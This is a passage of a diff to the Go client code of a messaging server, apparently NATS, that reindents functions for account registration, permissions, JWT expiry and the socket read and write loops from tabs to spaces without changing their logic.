c.ncs.Store(fmt.Sprintf(\"%s - lid%s:%d\", conn, ws, c.cid))\n+        case SYSTEM:\n+                c.ncs.Store(\"SYSTEM\")\n+        case JETSTREAM:\n+                c.ncs.Store(\"JETSTREAM\")\n+        case ACCOUNT:\n+                c.ncs.Store(\"ACCOUNT\")\n+        }\n }\n \n // RemoteAddress expose the Address of the client connection,\n // nil when not connected or unknown\n func (c *client) RemoteAddress() net.Addr {\n-\tc.mu.Lock()\n-\tdefer c.mu.Unlock()\n+        c.mu.Lock()\n+        defer c.mu.Unlock()\n \n-\tif c.nc == nil {\n-\t\treturn nil\n-\t}\n+        if c.nc == nil {\n+                return nil\n+        }\n \n-\treturn c.nc.RemoteAddr()\n+        return c.nc.RemoteAddr()\n }\n \n // Helper function to report errors.\n func (c *client) reportErrRegisterAccount(acc *Account, err error) {\n-\tif err == ErrTooManyAccountConnections {\n-\t\tc.maxAccountConnExceeded()\n-\t\treturn\n-\t}\n-\tc.Errorf(\"Problem registering with account %q: %s\", acc.Name, err)\n-\tc.sendErr(\"Failed Account Registration\")\n+        if err == ErrTooManyAccountConnections {\n+                c.maxAccountConnExceeded()\n+                return\n+        }\n+        c.Errorf(\"Problem registering with account %q: %s\", acc.Name, err)\n+        c.sendErr(\"Failed Account Registration\")\n }\n \n // Kind returns the client kind and will be one of the defined constants like CLIENT, ROUTER, GATEWAY, LEAF\n func (c *client) Kind() int {\n-\tc.mu.Lock()\n-\tkind := c.kind\n-\tc.mu.Unlock()\n+        c.mu.Lock()\n+        kind := c.kind\n+        c.mu.Unlock()\n \n-\treturn kind\n+        return kind\n }\n \n // registerWithAccount will register the given user with a specific\n // account. This will change the subject namespace.\n func (c *client) registerWithAccount(acc *Account) error {\n-\tif acc == nil || acc.sl == nil {\n-\t\treturn ErrBadAccount\n-\t}\n-\t// If we were previously registered, usually to $G, do accounting here to remove.\n-\tif c.acc != nil {\n-\t\tif prev := c.acc.removeClient(c); prev == 1 && c.srv != nil {\n-\t\t\tc.srv.decActiveAccounts()\n-\t\t}\n-\t}\n-\n-\tc.mu.Lock()\n-\tkind := c.kind\n-\tsrv := c.srv\n-\tc.acc = acc\n-\tc.applyAccountLimits()\n-\tc.mu.Unlock()\n-\n-\t// Check if we have a max connections violation\n-\tif kind == CLIENT && acc.MaxTotalConnectionsReached() {\n-\t\treturn ErrTooManyAccountConnections\n-\t} else if kind == LEAF && acc.MaxTotalLeafNodesReached() {\n-\t\treturn ErrTooManyAccountConnections\n-\t}\n-\n-\t// Add in new one.\n-\tif prev := acc.addClient(c); prev == 0 && srv != nil {\n-\t\tsrv.incActiveAccounts()\n-\t}\n-\n-\treturn nil\n+        if acc == nil || acc.sl == nil {\n+                return ErrBadAccount\n+        }\n+        // If we were previously registered, usually to $G, do accounting here to remove.\n+        if c.acc != nil {\n+                if prev := c.acc.removeClient(c); prev == 1 && c.srv != nil {\n+                        c.srv.decActiveAccounts()\n+                }\n+        }\n+\n+        c.mu.Lock()\n+        kind := c.kind\n+        srv := c.srv\n+        c.acc = acc\n+        c.applyAccountLimits()\n+        c.mu.Unlock()\n+\n+        // Check if we have a max connections violation\n+        if kind == CLIENT && acc.MaxTotalConnectionsReached() {\n+                return ErrTooManyAccountConnections\n+        } else if kind == LEAF && acc.MaxTotalLeafNodesReached() {\n+                return ErrTooManyAccountConnections\n+        }\n+\n+        // Add in new one.\n+        if prev := acc.addClient(c); prev == 0 && srv != nil {\n+                srv.incActiveAccounts()\n+        }\n+\n+        return nil\n }\n \n // Helper to determine if we have met or exceeded max subs.\n func (c *client) subsAtLimit() bool {\n-\treturn c.msubs != jwt.NoLimit && len(c.subs) >= int(c.msubs)\n+        return c.msubs != jwt.NoLimit && len(c.subs) >= int(c.msubs)\n }\n \n func minLimit(value *int32, limit int32) bool {\n-\tif *value != jwt.NoLimit {\n-\t\tif limit != jwt.NoLimit {\n-\t\t\tif limit < *value {\n-\t\t\t\t*value = limit\n-\t\t\t\treturn true\n-\t\t\t}\n-\t\t}\n-\t} else if limit != jwt.NoLimit {\n-\t\t*value = limit\n-\t\treturn true\n-\t}\n-\treturn false\n+        if *value != jwt.NoLimit {\n+                if limit != jwt.NoLimit {\n+                        if limit < *value {\n+                                *value = limit\n+                                return true\n+                        }\n+                }\n+        } else if limit != jwt.NoLimit {\n+                *value = limit\n+                return true\n+        }\n+        return false\n }\n \n // Apply account limits\n // Lock is held on entry.\n // FIXME(dlc) - Should server be able to override here?\n func (c *client) applyAccountLimits() {\n-\tif c.acc == nil || (c.kind != CLIENT && c.kind != LEAF) {\n-\t\treturn\n-\t}\n-\tc.mpay = jwt.NoLimit\n-\tc.msubs = jwt.NoLimit\n-\tif c.opts.JWT != _EMPTY_ { // user jwt implies account\n-\t\tif uc, _ := jwt.DecodeUserClaims(c.opts.JWT); uc != nil {\n-\t\t\tc.mpay = int32(uc.Limits.Payload)\n-\t\t\tc.msubs = int32(uc.Limits.Subs)\n-\t\t\tif uc.IssuerAccount != _EMPTY_ && uc.IssuerAccount != uc.Issuer {\n-\t\t\t\tif scope, ok := c.acc.signingKeys[uc.Issuer]; ok {\n-\t\t\t\t\tif userScope, ok := scope.(*jwt.UserScope); ok {\n-\t\t\t\t\t\t// if signing key disappeared or changed and we don't get here, the client will be disconnected\n-\t\t\t\t\t\tc.mpay = int32(userScope.Template.Limits.Payload)\n-\t\t\t\t\t\tc.msubs = int32(userScope.Template.Limits.Subs)\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\tminLimit(&c.mpay, c.acc.mpay)\n-\tminLimit(&c.msubs, c.acc.msubs)\n-\ts := c.srv\n-\topts := s.getOpts()\n-\tmPay := opts.MaxPayload\n-\t// options encode unlimited differently\n-\tif mPay == 0 {\n-\t\tmPay = jwt.NoLimit\n-\t}\n-\tmSubs := int32(opts.MaxSubs)\n-\tif mSubs == 0 {\n-\t\tmSubs = jwt.NoLimit\n-\t}\n-\twasUnlimited := c.mpay == jwt.NoLimit\n-\tif minLimit(&c.mpay, mPay) && !wasUnlimited {\n-\t\tc.Errorf(\"Max Payload set to %d from server overrides account or user config\", opts.MaxPayload)\n-\t}\n-\twasUnlimited = c.msubs == jwt.NoLimit\n-\tif minLimit(&c.msubs, mSubs) && !wasUnlimited {\n-\t\tc.Errorf(\"Max Subscriptions set to %d from server overrides account or user config\", opts.MaxSubs)\n-\t}\n-\tif c.subsAtLimit() {\n-\t\tgo func() {\n-\t\t\tc.maxSubsExceeded()\n-\t\t\ttime.Sleep(20 * time.Millisecond)\n-\t\t\tc.closeConnection(MaxSubscriptionsExceeded)\n-\t\t}()\n-\t}\n+        if c.acc == nil || (c.kind != CLIENT && c.kind != LEAF) {\n+                return\n+        }\n+        c.mpay = jwt.NoLimit\n+        c.msubs = jwt.NoLimit\n+        if c.opts.JWT != _EMPTY_ { // user jwt implies account\n+                if uc, _ := jwt.DecodeUserClaims(c.opts.JWT); uc != nil {\n+                        c.mpay = int32(uc.Limits.Payload)\n+                        c.msubs = int32(uc.Limits.Subs)\n+                        if uc.IssuerAccount != _EMPTY_ && uc.IssuerAccount != uc.Issuer {\n+                                if scope, ok := c.acc.signingKeys[uc.Issuer]; ok {\n+                                        if userScope, ok := scope.(*jwt.UserScope); ok {\n+                                                // if signing key disappeared or changed and we don't get here, the client will be disconnected\n+                                                c.mpay = int32(userScope.Template.Limits.Payload)\n+                                                c.msubs = int32(userScope.Template.Limits.Subs)\n+                                        }\n+                                }\n+                        }\n+                }\n+        }\n+        minLimit(&c.mpay, c.acc.mpay)\n+        minLimit(&c.msubs, c.acc.msubs)\n+        s := c.srv\n+        opts := s.getOpts()\n+        mPay := opts.MaxPayload\n+        // options encode unlimited differently\n+        if mPay == 0 {\n+                mPay = jwt.NoLimit\n+        }\n+        mSubs := int32(opts.MaxSubs)\n+        if mSubs == 0 {\n+                mSubs = jwt.NoLimit\n+        }\n+        wasUnlimited := c.mpay == jwt.NoLimit\n+        if minLimit(&c.mpay, mPay) && !wasUnlimited {\n+                c.Errorf(\"Max Payload set to %d from server overrides account or user config\", opts.MaxPayload)\n+        }\n+        wasUnlimited = c.msubs == jwt.NoLimit\n+        if minLimit(&c.msubs, mSubs) && !wasUnlimited {\n+                c.Errorf(\"Max Subscriptions set to %d from server overrides account or user config\", opts.MaxSubs)\n+        }\n+        if c.subsAtLimit() {\n+                go func() {\n+                        c.maxSubsExceeded()\n+                        time.Sleep(20 * time.Millisecond)\n+                        c.closeConnection(MaxSubscriptionsExceeded)\n+                }()\n+        }\n }\n \n // RegisterUser allows auth to call back into a new client\n // with the authenticated user. This is used to map\n // any permissions into the client and setup accounts.\n func (c *client) RegisterUser(user *User) {\n-\t// Register with proper account and sublist.\n-\tif user.Account != nil {\n-\t\tif err := c.registerWithAccount(user.Account); err != nil {\n-\t\t\tc.reportErrRegisterAccount(user.Account, err)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\tc.mu.Lock()\n-\n-\t// Assign permissions.\n-\tif user.Permissions == nil {\n-\t\t// Reset perms to nil in case client previously had them.\n-\t\tc.perms = nil\n-\t\tc.mperms = nil\n-\t} else {\n-\t\tc.setPermissions(user.Permissions)\n-\t}\n-\n-\t// allows custom authenticators to set a username to be reported in\n-\t// server events and more\n-\tif user.Username != _EMPTY_ {\n-\t\tc.opts.Username = user.Username\n-\t}\n-\n-\tc.mu.Unlock()\n+        // Register with proper account and sublist.\n+        if user.Account != nil {\n+                if err := c.registerWithAccount(user.Account); err != nil {\n+                        c.reportErrRegisterAccount(user.Account, err)\n+                        return\n+                }\n+        }\n+\n+        c.mu.Lock()\n+\n+        // Assign permissions.\n+        if user.Permissions == nil {\n+                // Reset perms to nil in case client previously had them.\n+                c.perms = nil\n+                c.mperms = nil\n+        } else {\n+                c.setPermissions(user.Permissions)\n+        }\n+\n+        // allows custom authenticators to set a username to be reported in\n+        // server events and more\n+        if user.Username != _EMPTY_ {\n+                c.opts.Username = user.Username\n+        }\n+\n+        c.mu.Unlock()\n }\n \n // RegisterNkeyUser allows auth to call back into a new nkey\n // client with the authenticated user. This is used to map\n // any permissions into the client and setup accounts.\n func (c *client) RegisterNkeyUser(user *NkeyUser) error {\n-\t// Register with proper account and sublist.\n-\tif user.Account != nil {\n-\t\tif err := c.registerWithAccount(user.Account); err != nil {\n-\t\t\tc.reportErrRegisterAccount(user.Account, err)\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\tc.mu.Lock()\n-\tc.user = user\n-\t// Assign permissions.\n-\tif user.Permissions == nil {\n-\t\t// Reset perms to nil in case client previously had them.\n-\t\tc.perms = nil\n-\t\tc.mperms = nil\n-\t} else {\n-\t\tc.setPermissions(user.Permissions)\n-\t}\n-\tc.mu.Unlock()\n-\treturn nil\n+        // Register with proper account and sublist.\n+        if user.Account != nil {\n+                if err := c.registerWithAccount(user.Account); err != nil {\n+                        c.reportErrRegisterAccount(user.Account, err)\n+                        return err\n+                }\n+        }\n+\n+        c.mu.Lock()\n+        c.user = user\n+        // Assign permissions.\n+        if user.Permissions == nil {\n+                // Reset perms to nil in case client previously had them.\n+                c.perms = nil\n+                c.mperms = nil\n+        } else {\n+                c.setPermissions(user.Permissions)\n+        }\n+        c.mu.Unlock()\n+        return nil\n }\n \n func splitSubjectQueue(sq string) ([]byte, []byte, error) {\n-\tvals := strings.Fields(strings.TrimSpace(sq))\n-\ts := []byte(vals[0])\n-\tvar q []byte\n-\tif len(vals) == 2 {\n-\t\tq = []byte(vals[1])\n-\t} else if len(vals) > 2 {\n-\t\treturn nil, nil, fmt.Errorf(\"invalid subject-queue %q\", sq)\n-\t}\n-\treturn s, q, nil\n+        vals := strings.Fields(strings.TrimSpace(sq))\n+        s := []byte(vals[0])\n+        var q []byte\n+        if len(vals) == 2 {\n+                q = []byte(vals[1])\n+        } else if len(vals) > 2 {\n+                return nil, nil, fmt.Errorf(\"invalid subject-queue %q\", sq)\n+        }\n+        return s, q, nil\n }\n \n // Initializes client.perms structure.\n // Lock is held on entry.\n func (c *client) setPermissions(perms *Permissions) {\n-\tif perms == nil {\n-\t\treturn\n-\t}\n-\tc.perms = &permissions{}\n-\n-\t// Loop over publish permissions\n-\tif perms.Publish != nil {\n-\t\tif perms.Publish.Allow != nil {\n-\t\t\tc.perms.pub.allow = NewSublistWithCache()\n-\t\t}\n-\t\tfor _, pubSubject := range perms.Publish.Allow {\n-\t\t\tsub := &subscription{subject: []byte(pubSubject)}\n-\t\t\tc.perms.pub.allow.Insert(sub)\n-\t\t}\n-\t\tif len(perms.Publish.Deny) > 0 {\n-\t\t\tc.perms.pub.deny = NewSublistWithCache()\n-\t\t}\n-\t\tfor _, pubSubject := range perms.Publish.Deny {\n-\t\t\tsub := &subscription{subject: []byte(pubSubject)}\n-\t\t\tc.perms.pub.deny.Insert(sub)\n-\t\t}\n-\t}\n-\n-\t// Check if we are allowed to send responses.\n-\tif perms.Response != nil {\n-\t\trp := *perms.Response\n-\t\tc.perms.resp = &rp\n-\t\tc.replies = make(map[string]*resp)\n-\t}\n-\n-\t// Loop over subscribe permissions\n-\tif perms.Subscribe != nil {\n-\t\tvar err error\n-\t\tif len(perms.Subscribe.Allow) > 0 {\n-\t\t\tc.perms.sub.allow = NewSublistWithCache()\n-\t\t}\n-\t\tfor _, subSubject := range perms.Subscribe.Allow {\n-\t\t\tsub := &subscription{}\n-\t\t\tsub.subject, sub.queue, err = splitSubjectQueue(subSubject)\n-\t\t\tif err != nil {\n-\t\t\t\tc.Errorf(\"%s\", err.Error())\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t\tc.perms.sub.allow.Insert(sub)\n-\t\t}\n-\t\tif len(perms.Subscribe.Deny) > 0 {\n-\t\t\tc.perms.sub.deny = NewSublistWithCache()\n-\t\t\t// Also hold onto this array for later.\n-\t\t\tc.darray = perms.Subscribe.Deny\n-\t\t}\n-\t\tfor _, subSubject := range perms.Subscribe.Deny {\n-\t\t\tsub := &subscription{}\n-\t\t\tsub.subject, sub.queue, err = splitSubjectQueue(subSubject)\n-\t\t\tif err != nil {\n-\t\t\t\tc.Errorf(\"%s\", err.Error())\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t\tc.perms.sub.deny.Insert(sub)\n-\t\t}\n-\t}\n-\n-\t// If we are a leafnode and we are the hub copy the extracted perms\n-\t// to resend back to soliciting server. These are reversed from the\n-\t// way routes interpret them since this is how the soliciting server\n-\t// will receive these back in an update INFO.\n-\tif c.isHubLeafNode() {\n-\t\tc.opts.Import = perms.Subscribe\n-\t\tc.opts.Export = perms.Publish\n-\t}\n+        if perms == nil {\n+                return\n+        }\n+        c.perms = &permissions{}\n+\n+        // Loop over publish permissions\n+        if perms.Publish != nil {\n+                if perms.Publish.Allow != nil {\n+                        c.perms.pub.allow = NewSublistWithCache()\n+                }\n+                for _, pubSubject := range perms.Publish.Allow {\n+                        sub := &subscription{subject: []byte(pubSubject)}\n+                        c.perms.pub.allow.Insert(sub)\n+                }\n+                if len(perms.Publish.Deny) > 0 {\n+                        c.perms.pub.deny = NewSublistWithCache()\n+                }\n+                for _, pubSubject := range perms.Publish.Deny {\n+                        sub := &subscription{subject: []byte(pubSubject)}\n+                        c.perms.pub.deny.Insert(sub)\n+                }\n+        }\n+\n+        // Check if we are allowed to send responses.\n+        if perms.Response != nil {\n+                rp := *perms.Response\n+                c.perms.resp = &rp\n+                c.replies = make(map[string]*resp)\n+        }\n+\n+        // Loop over subscribe permissions\n+        if perms.Subscribe != nil {\n+                var err error\n+                if len(perms.Subscribe.Allow) > 0 {\n+                        c.perms.sub.allow = NewSublistWithCache()\n+                }\n+                for _, subSubject := range perms.Subscribe.Allow {\n+                        sub := &subscription{}\n+                        sub.subject, sub.queue, err = splitSubjectQueue(subSubject)\n+                        if err != nil {\n+                                c.Errorf(\"%s\", err.Error())\n+                                continue\n+                        }\n+                        c.perms.sub.allow.Insert(sub)\n+                }\n+                if len(perms.Subscribe.Deny) > 0 {\n+                        c.perms.sub.deny = NewSublistWithCache()\n+                        // Also hold onto this array for later.\n+                        c.darray = perms.Subscribe.Deny\n+                }\n+                for _, subSubject := range perms.Subscribe.Deny {\n+                        sub := &subscription{}\n+                        sub.subject, sub.queue, err = splitSubjectQueue(subSubject)\n+                        if err != nil {\n+                                c.Errorf(\"%s\", err.Error())\n+                                continue\n+                        }\n+                        c.perms.sub.deny.Insert(sub)\n+                }\n+        }\n+\n+        // If we are a leafnode and we are the hub copy the extracted perms\n+        // to resend back to soliciting server. These are reversed from the\n+        // way routes interpret them since this is how the soliciting server\n+        // will receive these back in an update INFO.\n+        if c.isHubLeafNode() {\n+                c.opts.Import = perms.Subscribe\n+                c.opts.Export = perms.Publish\n+        }\n }\n \n type denyType int\n \n const (\n-\tpub = denyType(iota + 1)\n-\tsub\n-\tboth\n+        pub = denyType(iota + 1)\n+        sub\n+        both\n )\n \n // Merge client.perms structure with additional pub deny permissions\n // Lock is held on entry.\n func (c *client) mergeDenyPermissions(what denyType, denyPubs []string) {\n-\tif len(denyPubs) == 0 {\n-\t\treturn\n-\t}\n-\tif c.perms == nil {\n-\t\tc.perms = &permissions{}\n-\t}\n-\tvar perms []*perm\n-\tswitch what {\n-\tcase pub:\n-\t\tperms = []*perm{&c.perms.pub}\n-\tcase sub:\n-\t\tperms = []*perm{&c.perms.sub}\n-\tcase both:\n-\t\tperms = []*perm{&c.perms.pub, &c.perms.sub}\n-\t}\n-\tfor _, p := range perms {\n-\t\tif p.deny == nil {\n-\t\t\tp.deny = NewSublistWithCache()\n-\t\t}\n-\tFOR_DENY:\n-\t\tfor _, subj := range denyPubs {\n-\t\t\tr := p.deny.Match(subj)\n-\t\t\tfor _, v := range r.qsubs {\n-\t\t\t\tfor _, s := range v {\n-\t\t\t\t\tif string(s.subject) == subj {\n-\t\t\t\t\t\tcontinue FOR_DENY\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tfor _, s := range r.psubs {\n-\t\t\t\tif string(s.subject) == subj {\n-\t\t\t\t\tcontinue FOR_DENY\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tsub := &subscription{subject: []byte(subj)}\n-\t\t\tp.deny.Insert(sub)\n-\t\t}\n-\t}\n+        if len(denyPubs) == 0 {\n+                return\n+        }\n+        if c.perms == nil {\n+                c.perms = &permissions{}\n+        }\n+        var perms []*perm\n+        switch what {\n+        case pub:\n+                perms = []*perm{&c.perms.pub}\n+        case sub:\n+                perms = []*perm{&c.perms.sub}\n+        case both:\n+                perms = []*perm{&c.perms.pub, &c.perms.sub}\n+        }\n+        for _, p := range perms {\n+                if p.deny == nil {\n+                        p.deny = NewSublistWithCache()\n+                }\n+        FOR_DENY:\n+                for _, subj := range denyPubs {\n+                        r := p.deny.Match(subj)\n+                        for _, v := range r.qsubs {\n+                                for _, s := range v {\n+                                        if string(s.subject) == subj {\n+                                                continue FOR_DENY\n+                                        }\n+                                }\n+                        }\n+                        for _, s := range r.psubs {\n+                                if string(s.subject) == subj {\n+                                        continue FOR_DENY\n+                                }\n+                        }\n+                        sub := &subscription{subject: []byte(subj)}\n+                        p.deny.Insert(sub)\n+                }\n+        }\n }\n \n // Merge client.perms structure with additional pub deny permissions\n // Client lock must not be held on entry\n func (c *client) mergeDenyPermissionsLocked(what denyType, denyPubs []string) {\n-\tc.mu.Lock()\n-\tc.mergeDenyPermissions(what, denyPubs)\n-\tc.mu.Unlock()\n+        c.mu.Lock()\n+        c.mergeDenyPermissions(what, denyPubs)\n+        c.mu.Unlock()\n }\n \n // Check to see if we have an expiration for the user JWT via base claims.\n // FIXME(dlc) - Clear on connect with new JWT.\n func (c *client) setExpiration(claims *jwt.ClaimsData, validFor time.Duration) {\n-\tif claims.Expires == 0 {\n-\t\tif validFor != 0 {\n-\t\t\tc.setExpirationTimer(validFor)\n-\t\t}\n-\t\treturn\n-\t}\n-\texpiresAt := time.Duration(0)\n-\ttn := time.Now().Unix()\n-\tif claims.Expires > tn {\n-\t\texpiresAt = time.Duration(claims.Expires-tn) * time.Second\n-\t}\n-\tif validFor != 0 && validFor < expiresAt {\n-\t\tc.setExpirationTimer(validFor)\n-\t} else {\n-\t\tc.setExpirationTimer(expiresAt)\n-\t}\n+        if claims.Expires == 0 {\n+                if validFor != 0 {\n+                        c.setExpirationTimer(validFor)\n+                }\n+                return\n+        }\n+        expiresAt := time.Duration(0)\n+        tn := time.Now().Unix()\n+        if claims.Expires > tn {\n+                expiresAt = time.Duration(claims.Expires-tn) * time.Second\n+        }\n+        if validFor != 0 && validFor < expiresAt {\n+                c.setExpirationTimer(validFor)\n+        } else {\n+                c.setExpirationTimer(expiresAt)\n+        }\n }\n \n // This will load up the deny structure used for filtering delivered\n // messages based on a deny clause for subscriptions.\n // Lock should be held.\n func (c *client) loadMsgDenyFilter() {\n-\tc.mperms = &msgDeny{NewSublistWithCache(), make(map[string]bool)}\n-\tfor _, sub := range c.darray {\n-\t\tc.mperms.deny.Insert(&subscription{subject: []byte(sub)})\n-\t}\n+        c.mperms = &msgDeny{NewSublistWithCache(), make(map[string]bool)}\n+        for _, sub := range c.darray {\n+                c.mperms.deny.Insert(&subscription{subject: []byte(sub)})\n+        }\n }\n \n // writeLoop is the main socket write functionality.\n // Runs in its own Go routine.\n func (c *client) writeLoop() {\n-\tdefer c.srv.grWG.Done()\n-\tc.mu.Lock()\n-\tif c.isClosed() {\n-\t\tc.mu.Unlock()\n-\t\treturn\n-\t}\n-\tc.flags.set(writeLoopStarted)\n-\tc.mu.Unlock()\n-\n-\t// Used to check that we did flush from last wake up.\n-\twaitOk := true\n-\tvar closed bool\n-\n-\t// Main loop. Will wait to be signaled and then will use\n-\t// buffered outbound structure for efficient writev to the underlying socket.\n-\tfor {\n-\t\tc.mu.Lock()\n-\t\tif closed = c.isClosed(); !closed {\n-\t\t\towtf := c.out.fsp > 0 && c.out.pb < maxBufSize && c.out.fsp < maxFlushPending\n-\t\t\tif waitOk && (c.out.pb == 0 || owtf) {\n-\t\t\t\tc.out.sg.Wait()\n-\t\t\t\t// Check that connection has not been closed while lock was released\n-\t\t\t\t// in the conditional wait.\n-\t\t\t\tclosed = c.isClosed()\n-\t\t\t}\n-\t\t}\n-\t\tif closed {\n-\t\t\tc.flushAndClose(false)\n-\t\t\tc.mu.Unlock()\n-\n-\t\t\t// We should always call closeConnection() to ensure that state is\n-\t\t\t// properly cleaned-up. It will be a no-op if already done.\n-\t\t\tc.closeConnection(WriteError)\n-\n-\t\t\t// Now explicitly call reconnect(). Thanks to ref counting, we know\n-\t\t\t// that the reconnect will execute only after connection has been\n-\t\t\t// removed from the server state.\n-\t\t\tc.reconnect()\n-\t\t\treturn\n-\t\t}\n-\t\t// Flush data\n-\t\twaitOk = c.flushOutbound()\n-\t\tc.mu.Unlock()\n-\t}\n+        defer c.srv.grWG.Done()\n+        c.mu.Lock()\n+        if c.isClosed() {\n+                c.mu.Unlock()\n+                return\n+        }\n+        c.flags.set(writeLoopStarted)\n+        c.mu.Unlock()\n+\n+        // Used to check that we did flush from last wake up.\n+        waitOk := true\n+        var closed bool\n+\n+        // Main loop. Will wait to be signaled and then will use\n+        // buffered outbound structure for efficient writev to the underlying socket.\n+        for {\n+                c.mu.Lock()\n+                if closed = c.isClosed(); !closed {\n+                        owtf := c.out.fsp > 0 && c.out.pb < maxBufSize && c.out.fsp < maxFlushPending\n+                        if waitOk && (c.out.pb == 0 || owtf) {\n+                                c.out.sg.Wait()\n+                                // Check that connection has not been closed while lock was released\n+                                // in the conditional wait.\n+                                closed = c.isClosed()\n+                        }\n+                }\n+                if closed {\n+                        c.flushAndClose(false)\n+                        c.mu.Unlock()\n+\n+                        // We should always call closeConnection() to ensure that state is\n+                        // properly cleaned-up. It will be a no-op if already done.\n+                        c.closeConnection(WriteError)\n+\n+                        // Now explicitly call reconnect(). Thanks to ref counting, we know\n+                        // that the reconnect will execute only after connection has been\n+                        // removed from the server state.\n+                        c.reconnect()\n+                        return\n+                }\n+                // Flush data\n+                waitOk = c.flushOutbound()\n+                c.mu.Unlock()\n+        }\n }\n \n // flushClients will make sure to flush any clients we may have\n // sent to during processing. We pass in a budget as a time.Duration\n // for how much time to spend in place flushing for this client.\n func (c *client) flushClients(budget time.Duration) time.Time {\n-\tlast := time.Now().UTC()\n+        last := time.Now().UTC()\n \n-\t// Check pending clients for flush.\n-\tfor cp := range c.pcd {\n-\t\t// TODO(dlc) - Wonder if it makes more sense to create a new map?\n-\t\tdelete(c.pcd, cp)\n+        // Check pending clients for flush.\n+        for cp := range c.pcd {\n+                // TODO(dlc) - Wonder if it makes more sense to create a new map?\n+                delete(c.pcd, cp)\n \n-\t\t// Queue up a flush for those in the set\n-\t\tcp.mu.Lock()\n-\t\t// Update last activity for message delivery\n-\t\tcp.last = last\n-\t\t// Remove ourselves from the pending list.\n-\t\tcp.out.fsp--\n+                // Queue up a flush for those in the set\n+                cp.mu.Lock()\n+                // Update last activity for message delivery\n+                cp.last = last\n+                // Remove ourselves from the pending list.\n+                cp.out.fsp--\n \n-\t\t// Just ignore if this was closed.\n-\t\tif cp.isClosed() {\n-\t\t\tcp.mu.Unlock()\n-\t\t\tcontinue\n-\t\t}\n+                // Just ignore if this was closed.\n+                if cp.isClosed() {\n+                        cp.mu.Unlock()\n+                        continue\n+                }\n \n-\t\tif budget > 0 && cp.out.lft < 2*budget && cp.flushOutbound() {\n-\t\t\tbudget -= cp.out.lft\n-\t\t} else {\n-\t\t\tcp.flushSignal()\n-\t\t}\n+                if budget > 0 && cp.out.lft < 2*budget && cp.flushOutbound() {\n+                        budget -= cp.out.lft\n+                } else {\n+                        cp.flushSignal()\n+                }\n \n-\t\tcp.mu.Unlock()\n-\t}\n-\treturn last\n+                cp.mu.Unlock()\n+        }\n+        return last\n }\n \n // readLoop is the main socket read functionality.\n // Runs in its own Go routine.\n func (c *client) readLoop(pre []byte) {\n-\t// Grab the connection off the client, it will be cleared on a close.\n-\t// We check for that after the loop, but want to avoid a nil dereference\n-\tc.mu.Lock()\n-\ts := c.srv\n-\tdefer s.grWG.Done()\n-\tif c.isClosed() {\n-\t\tc.mu.Unlock()\n-\t\treturn\n-\t}\n-\tnc := c.nc\n-\tws := c.isWebsocket()\n-\tif c.isMqtt() {\n-\t\tc.mqtt.r = &mqttReader{reader: nc}\n-\t}\n-\tc.in.rsz = startBufSize\n-\n-\t// Check the per-account-cache for closed subscriptions\n-\tcpacc := c.kind == ROUTER || c.kind == GATEWAY\n-\t// Last per-account-cache check for closed subscriptions\n-\tlpacc := time.Now()\n-\tacc := c.acc\n-\tvar masking bool\n-\tif ws {\n-\t\tmasking = c.ws.maskread\n-\t}\n-\tc.mu.Unlock()\n-\n-\tdefer func() {\n-\t\tif c.isMqtt() {\n-\t\t\ts.mqttHandleClosedClient(c)\n-\t\t}\n-\t\t// These are used only in the readloop, so we can set them to nil\n-\t\t// on exit of the readLoop.\n-\t\tc.in.results, c.in.pacache = nil, nil\n-\t}()\n-\n-\t// Start read buffer.\n-\tb := make([]byte, c.in.rsz)\n-\n-\t// Websocket clients will return several slices if there are multiple\n-\t// websocket frames in the blind read. For non WS clients though, we\n-\t// will always have 1 slice per loop iteration. So we define this here\n-\t// so non WS clients will use bufs[0] = b[:n].\n-\tvar _bufs [1][]byte\n-\tbufs := _bufs[:1]\n-\n-\tvar wsr *wsReadInfo\n-\tif ws {\n-\t\twsr = &wsReadInfo{mask: masking}\n-\t\twsr.init()\n-\t}\n-\n-\tfor {\n-\t\tvar n int\n-\t\tvar err error\n-\n-\t\t// If we have a pre buffer parse that first.\n-\t\tif len(pre) > 0 {\n-\t\t\tb = pre\n-\t\t\tn = len(pre)\n-\t\t\tpre = nil\n-\t\t} else {\n-\t\t\tn, err = nc.Read(b)\n-\t\t\t// If we have any data we will try to parse and exit at the end.\n-\t\t\tif n == 0 && err != nil {\n-\t\t\t\tc.closeConnection(closedStateForErr(err))\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t}\n-\t\tif ws {\n-\t\t\tbufs, err = c.wsRead(wsr, nc, b[:n])\n-\t\t\tif bufs == nil && err != nil {\n-\t\t\t\tif err != io.EOF {\n-\t\t\t\t\tc.Errorf(\"read error: %v\", err)\n-\t\t\t\t}\n-\t\t\t\tc.closeConnection(closedStateForErr(err))\n-\t\t\t} else if bufs == nil {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t} else {\n-\t\t\tbufs[0] = b[:n]\n-\t\t}\n-\t\tstart := time.Now()\n-\n-\t\t// Check if the account has mappings and if so set the local readcache flag.\n-\t\t// We check here to make sure any changes such as config reload are reflected here.\n-\t\tif c.kind == CLIENT || c.kind == LEAF {\n-\t\t\tif acc.hasMappings() {\n-\t\t\t\tc.in.flags.set(hasMappings)\n-\t\t\t} else {\n-\t\t\t\tc.in.flags.clear(hasMappings)\n-\t\t\t}\n-\t\t}\n-\n-\t\t// Clear inbound stats cache\n-\t\tc.in.msgs = 0\n-\t\tc.in.bytes = 0\n-\t\tc.in.subs = 0\n-\n-\t\t// Main call into parser for inbound data. This will generate callouts\n-\t\t// to process messages, etc.\n-\t\tfor i := 0; i < len(bufs); i++ {\n-\t\t\tif err := c.parse(bufs[i]); err != nil {\n-\t\t\t\tif dur := time.Since(start); dur >= readLoopReportThreshold {\n-\t\t\t\t\tc.Warnf(\"Readloop processing time: %v\", dur)\n-\t\t\t\t}\n-\t\t\t\t// Need to call flushClients because some of the clients have been\n-\t\t\t\t// assigned messages and their \"fsp\" incremented, and need now to be\n-\t\t\t\t// decremented and their writeLoop signaled.\n-\t\t\t\tc.flushClients(0)\n-\t\t\t\t// handled inline\n-\t\t\t\tif err != ErrMaxPayload && err != ErrAuthentication 